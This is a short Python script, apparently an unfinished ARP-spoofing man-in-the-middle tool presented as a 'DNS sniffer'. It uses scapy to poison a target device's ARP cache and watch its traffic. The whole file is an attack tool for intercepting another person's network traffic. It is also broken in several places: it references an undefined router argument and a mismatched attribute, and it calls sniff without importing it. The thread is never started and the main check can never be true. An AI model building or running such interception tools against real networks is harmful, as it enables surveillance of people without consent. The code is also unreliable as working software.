import argparse
from scapy.all import arp_mitm
import threading

parser = argparse.ArgumentParser(description='DNS sniffer')
parser.add_argument('--targetip', help='Target device you want to watch', required=True)
parser.add_argument('--iface', help='Interface to use fot attack', required=True)
opts = parser.parse_args()

#Man in the Middle is possible with (ARP Spoffing)

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface
        
    def mitm(self):
        while True:
            try:
                arp_mitm(self.router_ip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying...')
                continue

    def capture(self):
        sniff(iface=self.iface, prn=self.dns, filter=f'')
    
    def watch(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t1.start
    
if __name__ == '__name__':
    device = Device(opts.routerip, opts.targetip, opts.iface)
    device.watch()
